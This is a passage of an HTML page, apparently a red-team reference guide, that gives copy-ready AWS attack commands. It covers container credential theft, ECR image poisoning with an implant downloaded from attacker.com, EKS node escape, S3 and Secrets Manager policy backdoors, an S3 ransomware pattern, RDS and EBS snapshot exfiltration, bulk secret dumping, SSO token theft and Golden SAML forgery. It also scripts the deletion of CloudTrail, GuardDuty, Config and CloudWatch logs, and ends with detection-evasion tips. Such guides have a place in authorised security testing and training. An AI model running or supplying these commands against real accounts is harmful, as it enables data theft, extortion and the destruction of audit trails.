+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F40D; Remote Shell <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ecs list-tasks --cluster prod-cluster
+
+aws ecs execute-command   --cluster prod-cluster   --task TASK_ARN   --container app   --command "/bin/sh"   --interactive
+
+<span class="cm"># Inside: steal creds and env vars</span>
+env | grep -i "aws\|pass\|key\|secret\|db"
+curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. ECR Image Poisoning</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1195.002</span>
+<div class="cd">Pull production image from ECR, add a backdoor, push back with same tag. Every container deployment from that point runs attacker code.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F433; Supply Chain Attack <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ecr get-login-password | docker login   --username AWS --password-stdin ACCOUNT.dkr.ecr.us-east-1.amazonaws.com
+
+docker pull ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/prod-api:latest
+
+cat > /tmp/Dockerfile << 'EOF'
+FROM ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/prod-api:latest
+RUN curl -s https://attacker.com/implant -o /usr/local/bin/.sys && chmod +x /usr/local/bin/.sys
+ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.sys & exec /original-entry.sh"]
+EOF
+docker build -t ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/prod-api:latest /tmp/
+docker push ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/prod-api:latest</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. EKS Privileged Pod Node Escape</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1611</span>
+<div class="cd">Deploy a privileged pod with host namespaces to escape to the underlying EC2 node, then steal node IMDS credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x2694;&#xFE0F; K8s Node Escape <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws eks update-kubeconfig --name prod-cluster
+
+kubectl apply -f - << 'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: shell
+    image: ubuntu:latest
+    command: ["/bin/bash","-c","nsenter -t 1 -m -u -i -n -- bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+EOF
+
+kubectl exec -it escape -- bash
+<span class="cm"># Now on node: steal IMDS credentials</span>
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== S3 ========== -->
+<section id="s3" class="section">
+<h2 class="pt">&#x1FAA3; Simple Storage Service (S3)</h2>
+<p class="ps">Object storage attacks: public bucket abuse, policy backdoors, data destruction</p>
+
+<div class="card"><div class="ct">1. Public Bucket Enumeration &amp; Download</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1530</span>
+<div class="cd">Public or misconfigured S3 buckets frequently contain source code, database backups, .env files, private keys, and PII.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E5; Discovery &amp; Loot <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Unauthenticated</span>
+aws s3 ls s3://BUCKET_NAME --no-sign-request
+aws s3 sync s3://BUCKET_NAME ./loot/ --no-sign-request
+
+<span class="cm"># Authenticated: dump all buckets</span>
+aws s3 ls | awk '{print $3}' | while read b; do
+  aws s3 sync s3://$b ./loot/$b/ 2>/dev/null
+done
+
+<span class="cm"># Find credentials in loot</span>
+find ./loot -name "*.env" -o -name "*.pem" -o -name "*.sql" |   xargs grep -l "password\|secret\|key" 2>/dev/null</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Cross-Account Bucket Policy Backdoor</div><span class="badge bh">HIGH</span><span class="badge bt">T1098</span>
+<div class="cd">Modify bucket policy to grant attacker account persistent read access. Survives key rotation on the victim side.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CB; Policy Backdoor <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws s3api put-bucket-policy --bucket TARGET_BUCKET   --policy '{
+    "Version":"2012-10-17",
+    "Statement":[{
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCT:root"},
+      "Action":["s3:GetObject","s3:ListBucket"],
+      "Resource":["arn:aws:s3:::TARGET_BUCKET","arn:aws:s3:::TARGET_BUCKET/*"]
+    }]
+  }'
+
+<span class="cm"># From attacker account anytime</span>
+aws s3 sync s3://TARGET_BUCKET ./exfil/ --profile attacker</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. S3 Ransomware Pattern</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1485</span>
+<div class="cd">Disable versioning, re-encrypt all objects with attacker KMS key. Organization cannot decrypt data without attacker involvement.</div>
+<div class="acc"><div class="ah rd" onclick="tog(this)">&#x1F4A3; Destructive Operations <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Suspend versioning (prevents recovery)</span>
+aws s3api put-bucket-versioning --bucket TARGET   --versioning-configuration Status=Suspended
+
+<span class="cm"># Re-encrypt with attacker KMS key</span>
+aws s3 cp s3://TARGET/ s3://TARGET/ --recursive   --sse aws:kms   --sse-kms-key-id arn:aws:kms:us-east-1:ATTACKER:key/KEY_ID   --metadata-directive REPLACE
+
+<span class="cm"># Organization cannot read any data</span></code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== RDS ========== -->
+<section id="rds" class="section">
+<h2 class="pt">&#x1F4CA; Relational Database Service (RDS)</h2>
+<p class="ps">Database compromise, snapshot exfiltration, and direct access</p>
+
+<div class="card"><div class="ct">1. RDS Snapshot Exfiltration</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1537</span>
+<div class="cd">Create a snapshot of any RDS database, share with attacker account, restore with custom password. Copies entire database offline.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4BE; Full DB Theft <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Create and share snapshot</span>
+aws rds create-db-snapshot   --db-instance-identifier prod-db   --db-snapshot-identifier prod-backup-$(date +%Y%m%d)
+
+aws rds modify-db-snapshot-attribute   --db-snapshot-identifier prod-backup-20240101   --attribute-name restore   --values-to-add ATTACKER_ACCOUNT_ID
+
+<span class="cm"># From attacker account: restore with known password</span>
+aws rds restore-db-instance-from-db-snapshot   --db-instance-identifier stolen-db   --db-snapshot-identifier arn:aws:rds:REGION:VICTIM:snapshot:prod-backup-20240101   --master-user-password "Attacker!1234"   --publicly-accessible</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Direct DB Access via SG + Secrets Manager</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1190</span>
+<div class="cd">Open RDS security group, retrieve password from Secrets Manager, connect directly to live database.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F50C; Direct Connection <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Get DB credentials</span>
+PASS=$(aws secretsmanager get-secret-value   --secret-id "/prod/rds/prod-db" --query SecretString -o text |   python3 -c "import sys,json;d=json.load(sys.stdin);print(d['password'])")
+
+<span class="cm"># Open security group to attacker</span>
+aws ec2 authorize-security-group-ingress   --group-id sg-RDS_SG --protocol tcp   --port 3306 --cidr ATTACKER_IP/32
+
+<span class="cm"># Connect</span>
+mysql -h prod-db.cluster-xxx.us-east-1.rds.amazonaws.com   -u admin -p"$PASS" -e "show databases;"</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. IAM Database Authentication Token</div><span class="badge bh">HIGH</span><span class="badge bt">T1078.004</span>
+<div class="cd">Generate a 15-minute auth token from stolen AWS credentials — no DB password needed if IAM auth is enabled.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F511; IAM Auth Token <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>TOKEN=$(aws rds generate-db-auth-token   --hostname prod-db.xxx.us-east-1.rds.amazonaws.com   --port 3306 --username db_iam_user)
+
+mysql -h prod-db.xxx.us-east-1.rds.amazonaws.com   -u db_iam_user --password="$TOKEN" --ssl-ca=rds-ca.pem</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== EBS ========== -->
+<section id="ebs" class="section">
+<h2 class="pt">&#x1F4BE; Elastic Block Store (EBS)</h2>
+<p class="ps">Volume and snapshot attacks for offline data access</p>
+
+<div class="card"><div class="ct">1. Public Snapshot Exposure</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1537</span>
+<div class="cd">Share EBS snapshots with attacker account or make fully public — any AWS account can then create a volume and read all data.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4F8; Snapshot Attack <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>SNAP=$(aws ec2 create-snapshot --volume-id vol-TARGET   --description "maintenance-backup" --query SnapshotId -o text)
+
+<span class="cm"># Share with attacker account</span>
+aws ec2 modify-snapshot-attribute --snapshot-id $SNAP   --attribute createVolumePermission   --operation-type add --user-ids ATTACKER_ACCOUNT_ID
+
+<span class="cm"># Or make fully public</span>
+aws ec2 modify-snapshot-attribute --snapshot-id $SNAP   --attribute createVolumePermission   --operation-type add --group-names all</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Volume Detach and Reattach</div><span class="badge bh">HIGH</span><span class="badge bt">T1005</span>
+<div class="cd">Detach a data volume from victim instance, attach to attacker instance in same AZ. Read all data without going through application layer.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4BE; Volume Transfer <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws ec2 detach-volume --volume-id vol-TARGET --force
+aws ec2 attach-volume   --volume-id vol-TARGET --instance-id i-ATTACKER --device /dev/sdf
+sudo mount /dev/xvdf1 /mnt/data
+find /mnt/data -name "*.env" -o -name "*.pem" -o -name "*.sql"</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== SECRETS ========== -->
+<section id="secrets" class="section">
+<h2 class="pt">&#x1F512; Secrets Manager</h2>
+<p class="ps">Bulk secret extraction, persistence via resource policies, and tampering</p>
+
+<div class="card"><div class="ct">1. Bulk Secret Extraction</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1555</span>
+<div class="cd">With secretsmanager:GetSecretValue, extract every secret in the account in minutes. DB passwords, API keys, OAuth tokens, TLS certs, payment credentials.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4E4; Complete Extraction <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws secretsmanager list-secrets   --query "SecretList[*].Name" -o text |   tr '	' '
+' | while read s; do
+    echo "===== $s ====="
+    aws secretsmanager get-secret-value       --secret-id "$s" --query SecretString -o text 2>/dev/null
+    echo ""
+  done > /tmp/all-secrets.txt
+
+<span class="cm"># High-value targets</span>
+grep -i "stripe\|rds\|github\|slack\|twilio\|datadog" /tmp/all-secrets.txt</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Cross-Account Resource Policy Backdoor</div><span class="badge bh">HIGH</span><span class="badge bt">T1098</span>
+<div class="cd">Add a resource policy to secrets granting attacker account direct access. Persists through key rotation and incident response.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F517; Persistent Access <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws secretsmanager put-resource-policy   --secret-id prod/database/credentials   --resource-policy '{
+    "Version":"2012-10-17",
+    "Statement":[{
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCT:root"},
+      "Action":["secretsmanager:GetSecretValue"],
+      "Resource":"*"
+    }]
+  }'
+
+<span class="cm"># From attacker account anytime</span>
+aws secretsmanager get-secret-value   --secret-id arn:aws:secretsmanager:us-east-1:VICTIM:secret:prod/database/credentials   --profile attacker</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Secret Tampering (Denial of Service)</div><span class="badge bh">HIGH</span><span class="badge bt">T1565</span>
+<div class="cd">Overwrite secret values to cause application failures or change credentials so only attacker knows them.</div>
+<div class="acc"><div class="ah rd" onclick="tog(this)">&#x1F4A5; Secret Tampering <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws secretsmanager update-secret   --secret-id TARGET_SECRET   --secret-string '{"username":"admin","password":"AttackerOwned!2024"}'
+<span class="cm"># Application now fails auth — or attacker logs in directly</span></code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== SSO ========== -->
+<section id="sso" class="section">
+<h2 class="pt">&#x1F464; Single Sign-On (IAM Identity Center)</h2>
+<p class="ps">Federation attacks for multi-account and org-wide compromise</p>
+
+<div class="card"><div class="ct">1. SSO Token Cache Theft</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1552</span>
+<div class="cd">AWS SSO session tokens are cached on developer machines. Stealing them provides access to every AWS account the user can reach via SSO.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F511; Token Extraction <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># SSO tokens cached here</span>
+ls ~/.aws/sso/cache/
+cat ~/.aws/sso/cache/*.json
+
+<span class="cm"># Extract token</span>
+TOKEN=$(cat ~/.aws/sso/cache/*.json |   python3 -c "import sys,json;print(json.load(sys.stdin).get('accessToken',''))")
+
+<span class="cm"># List all accessible accounts</span>
+aws sso list-accounts --access-token "$TOKEN"
+
+<span class="cm"># Get credentials for any account/role</span>
+aws sso get-role-credentials   --access-token "$TOKEN"   --account-id TARGET_ACCOUNT   --role-name AdministratorAccess</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. Golden SAML — SAML Assertion Forgery</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1606.002</span>
+<div class="cd">With the SAML signing key (from ADFS/Okta), forge assertions to impersonate any user and assume any federated AWS role. No MFA, no password needed.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F3AD; SAML Forgery <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Tool: Shimit (Golden SAML for AWS)</span>
+python3 shimit.py   --idp "https://adfs.victim.com/adfs/ls/"   --sp "https://signin.aws.amazon.com/saml"   --username "admin@company.com"   --role "arn:aws:iam::ACCOUNT:role/SAML-AdminRole"   --principal "arn:aws:iam::ACCOUNT:saml-provider/CorporateADFS"   --key adfs-signing.key   --cert adfs-signing.crt</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. Permission Set Privilege Escalation</div><span class="badge bh">HIGH</span><span class="badge bt">T1548</span>
+<div class="cd">Modify permission sets to escalate privileges across all provisioned accounts. One change propagates to the entire org.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CA; Org-Wide Escalation <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws sso-admin put-inline-policy-to-permission-set   --instance-arn INSTANCE_ARN   --permission-set-arn PERMISSION_SET_ARN   --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+
+aws sso-admin provision-permission-set   --instance-arn INSTANCE_ARN   --permission-set-arn PERMISSION_SET_ARN   --target-type ALL_PROVISIONED_ACCOUNTS</code></pre>
+</div></div></div>
+</section>
+
+<!-- ========== SECURITY SERVICES ========== -->
+<section id="security" class="section">
+<h2 class="pt">&#x1F6E1;&#xFE0F; AWS Security Services</h2>
+<p class="ps">Defeating detection, disabling monitoring, and covering tracks</p>
+
+<div class="card"><div class="ct">1. CloudTrail Destruction</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1562.008</span>
+<div class="cd">CloudTrail records all AWS API calls. Stop and delete it immediately after gaining admin access to remove all forensic audit capability.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F6AB; Kill Audit Logging <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># List all trails</span>
+aws cloudtrail describe-trails   --query "trailList[*].[Name,IsMultiRegionTrail,S3BucketName]" -o table
+
+<span class="cm"># Stop + delete</span>
+aws cloudtrail stop-logging --name TRAIL_ARN
+aws cloudtrail delete-trail --name TRAIL_ARN
+
+<span class="cm"># Delete S3 log contents</span>
+aws s3 rm s3://cloudtrail-logs-bucket/AWSLogs/ --recursive
+
+<span class="cm"># Multi-region sweep</span>
+for region in $(aws ec2 describe-regions --query "Regions[*].RegionName" -o text); do
+  for trail in $(aws cloudtrail list-trails --region $region     --query "Trails[*].TrailARN" -o text 2>/dev/null); do
+    aws cloudtrail stop-logging --name $trail --region $region
+  done
+done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">2. GuardDuty Deletion</div><span class="badge bc">CRITICAL</span><span class="badge bt">T1562</span>
+<div class="cd">GuardDuty detects anomalous behavior and known attack patterns. Delete it across all regions to blind all threat detection.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F6E1;&#xFE0F; GuardDuty Kill <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws guardduty list-detectors
+aws guardduty delete-detector --detector-id DETECTOR_ID
+
+<span class="cm"># Multi-region sweep</span>
+for region in $(aws ec2 describe-regions --query "Regions[*].RegionName" -o text); do
+  DET=$(aws guardduty list-detectors --region $region     --query "DetectorIds[0]" -o text 2>/dev/null)
+  [ "$DET" != "None" ] && [ -n "$DET" ] &&     aws guardduty delete-detector --detector-id $DET --region $region &&     echo "Deleted GuardDuty in $region"
+done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">3. AWS Config Disabling</div><span class="badge bh">HIGH</span><span class="badge bt">T1562</span>
+<div class="cd">AWS Config records resource changes and evaluates compliance rules. Stop recording and delete rules to prevent backdoor detection.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x2699;&#xFE0F; Config Destruction <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code>aws configservice stop-configuration-recorder   --configuration-recorder-name default
+
+aws configservice describe-config-rules   --query "ConfigRules[*].ConfigRuleName" -o text |   tr '	' '
+' | while read rule; do
+    aws configservice delete-config-rule --config-rule-name "$rule"
+  done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">4. CloudWatch Log Destruction</div><span class="badge bh">HIGH</span><span class="badge bt">T1562.008</span>
+<div class="cd">Delete CloudWatch alarms and log groups to destroy application, VPC flow, and Lambda execution logs.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F4CA; Log Destruction <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Delete all alarms</span>
+ALARMS=$(aws cloudwatch describe-alarms   --query "MetricAlarms[*].AlarmName" -o text)
+aws cloudwatch delete-alarms --alarm-names $ALARMS
+
+<span class="cm"># Delete all log groups</span>
+aws logs describe-log-groups   --query "logGroups[*].logGroupName" -o text |   tr '	' '
+' | while read lg; do
+    aws logs delete-log-group --log-group-name "$lg"
+  done</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">5. Security Hub &amp; Macie Disabling</div><span class="badge bm">MEDIUM</span><span class="badge bt">T1562</span>
+<div class="cd">Disable Security Hub to stop finding aggregation, and disable Macie to prevent S3 sensitive data discovery alerts.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F514; Silence Detections <span class="ar">&#x25BC;</span></div><div class="ab">
+<pre><code><span class="cm"># Disable Security Hub</span>
+aws securityhub disable-security-hub
+
+<span class="cm"># Disable Macie</span>
+aws macie2 disable-macie</code></pre>
+</div></div></div>
+
+<div class="card"><div class="ct">6. Stealth &amp; Evasion Tactics</div><span class="badge bh">HIGH</span><span class="badge bt">T1562</span>
+<div class="cd">Reduce detection probability by mimicking legitimate behavior and avoiding known GuardDuty detection signatures.</div>
+<div class="acc"><div class="ah bl" onclick="tog(this)">&#x1F977; OpSec Guide <span class="ar">&#x25BC;</span></div><div class="ab">
+<ul>
+<li><strong>Operate from AWS IPs</strong> — EC2/Lambda calls avoid TorIPCaller, KaliLinux GuardDuty findings</li>
+<li><strong>Use AssumeRole chains</strong> — each hop changes CloudTrail caller identity</li>
+<li><strong>Match business hours</strong> — 3am API calls trigger behavioral analytics</li>
+<li><strong>Use UpdateFunctionCode not CreateFunction</strong> — less visible in logs</li>
+<li><strong>Rate-limit API calls</strong> — avoid GuardDuty high-volume anomaly threshold</li>
+<li><strong>Avoid pentest UAs</strong> — Pacu, Scout, CloudSploit have flagged user-agents</li>
+<li><strong>Exfil via S3 sync</strong> — S3 traffic rarely alerts vs direct HTTP exfil</li>
+<li><strong>Find regions with no GuardDuty</strong> — operate in regions where GD is not enabled</li>
+</ul>
+<pre><code><span class="cm"># Find regions with GuardDuty disabled</span>
+for region in $(aws ec2 describe-regions   --query "Regions[*].RegionName" -o text); do
+  gd=$(aws guardduty list-detectors --region $region     --query "DetectorIds[0]" -o text 2>/dev/null)
+  [ -z "$gd" ] || [ "$gd" = "None" ] && echo "No GuardDuty: $region"
+done</code></pre>
+</div></div></div>
+</section>
+</main>
+</div>
+
+<footer>
+  <div style="color:var(--muted);margin-bottom:10px;">
+    &#x1F534; <strong style="color:var(--red)">Tushar Verma</strong> &mdash; Offensive Security Engineer<br>
+    <span style="font-size:.85em;">AWS Cloud Red Team Operations Reference Guide</span>
+  </div>
+  <div class="sl">
+    <a href="https://www.linkedin.com/in/tushars25/" target="_blank">&#x1F517; LinkedIn</a>
+    <a href="https://x.com/e11i0t_4lders0n" target="_blank">&#x1D54F; Twitter/X</a>
+  </div>
+</footer>
+
+<script>
+function init() {
+  var v = parseInt(localStorage.getItem("awsrtv") || "0") + 1;
+  localStorage.setItem("awsrtv", v);
+  document.getElementById("vc").textContent = v;
+}
+
+function nav(id, el) {
+  document.querySelectorAll(".section").forEach(function(s) {
+    s.classList.remove("active");
+  });
+  document.querySelectorAll(".sb-item, .mp").forEach(function(i) {
+    i.classList.remove("active");
+  });
+  var sec = document.getElementById(id);
+  if (sec) sec.classList.add("active");
+  if (el) el.classList.add("active");
+  // Scroll to top on both mobile and desktop
+  window.scrollTo(0, 0);
+  var content = document.querySelector(".content");
+  if (content) content.scrollTop = 0;
+}
+
+function tog(h) {
+  h.parentElement.classList.toggle("open");
+}
+
+window.addEventListener("DOMContentLoaded", init);
+</script>
+</body>
+</html>
